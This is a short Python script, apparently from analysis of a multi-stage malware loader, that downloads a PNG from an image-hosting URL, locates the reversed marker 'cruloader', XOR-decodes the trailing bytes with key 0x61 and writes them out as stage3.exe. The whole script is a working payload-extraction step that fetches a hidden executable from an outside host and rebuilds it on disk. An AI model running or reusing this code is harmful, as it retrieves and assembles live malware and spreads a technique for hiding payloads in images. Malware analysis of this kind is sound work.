import urllib.request

image_url = 'https://i.ibb.co/KsfqHym/PNG-02-Copy.png'
urllib.request.urlretrieve(image_url, "image.bin")

image_file = open("image.bin", mode="rb").read()

result = bytearray()
final_executable = image_file[image_file.index(b'cruloader'[::-1]) + 9:]
for each in final_executable:
    result.append(each ^ 0x61)

stage3 = open('.\stage3.exe', 'wb')
stage3.write(result)
stage3.close()